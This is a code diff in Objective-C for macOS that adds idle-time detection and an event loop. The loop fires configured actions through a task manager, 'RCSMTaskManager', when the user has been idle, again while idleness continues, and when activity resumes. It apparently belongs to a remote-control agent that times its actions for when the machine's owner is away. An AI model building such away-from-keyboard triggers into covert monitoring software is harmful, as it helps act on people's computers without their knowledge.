@@ -1192,4 +1192,127 @@ typedef struct {
   return;
 }
 
+- (UInt32)getIdleSec
+{
+  int64_t idlesecs = -1;
+  io_iterator_t iter = 0;
+  int64_t nanoseconds = 0;
+  
+  if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) 
+    {
+      io_registry_entry_t entry = IOIteratorNext(iter);
+      
+      if (entry) 
+        {
+          CFMutableDictionaryRef dict = NULL;
+          if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) 
+            {
+              CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
+              if (obj) 
+                {
+                  
+                  if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) 
+                      idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
+                }
+              CFRelease(dict);
+            }
+          
+          IOObjectRelease(entry);
+        }
+      IOObjectRelease(iter);
+    }
+  
+#ifdef DEBUG_EVENTS
+  infoLog(@"%s: idle %lu sec", __FUNCTION__, idlesecs);
+#endif
+  
+  return idlesecs;
+}
+
+- (BOOL)isInIdle:(UInt32) sec
+{
+  if ([self getIdleSec] > sec)
+    return TRUE;
+  else 
+    return FALSE;
+}
+
+- (void)eventIdle:(NSDictionary*)configuration
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  BOOL amIInIdle = FALSE;
+  BOOL idleTriggered = FALSE;
+  [configuration retain];
+  
+  UInt32 *seconds = (UInt32*)[[configuration objectForKey: @"data"] bytes];
+  
+  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int end           = [[configuration objectForKey:@"end"] intValue];
+  
+  int currentIter   = iter;
+  
+#ifdef DEBUG_EVENTS
+  infoLog(@"%s: starting idle event every %lu sec", __FUNCTION__, *seconds);
+#endif
+  
+  while ([configuration objectForKey: @"status"] != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+    {
+      amIInIdle = [self isInIdle: *seconds];
+    
+      if (amIInIdle == TRUE && idleTriggered == FALSE)
+        {
+          if ([self isEventEnable: configuration] == TRUE)
+            {
+#ifdef DEBUG_EVENTS
+              infoLog(@"%s: triggering idle start %d", __FUNCTION__, enterAction);
+#endif
+              idleTriggered = TRUE;
+              [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
+              currentIter = 0;
+            }
+        }
+      
+      if (amIInIdle == NO && idleTriggered == TRUE)
+        {
+          if ([self isEventEnable: configuration] == TRUE) 
+            {
+#ifdef DEBUG_EVENTS
+              infoLog(@"%s: triggering idle stop %d", __FUNCTION__, end);
+#endif
+              [[RCSMTaskManager sharedInstance] triggerAction: end];
+              idleTriggered = FALSE;
+            }
+        }
+    
+      if (amIInIdle == TRUE)
+        {
+          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
+              [self waitDelaySeconds:configuration] == FALSE &&
+              [self isEventEnable: configuration] == TRUE)
+            {
+#ifdef DEBUG_EVENTS
+              infoLog(@"%s: triggering idle repeat %d", __FUNCTION__, repeat);
+#endif
+              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
+              currentIter++;
+            }
+        }
+      
+      sleep(1);
+    }
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+    {
+    [configuration setValue: EVENT_STOPPED forKey: @"status"];
+    }
+  
+  [configuration release];
+  [outerPool release];
+  
+  return;
+}
+
 @end
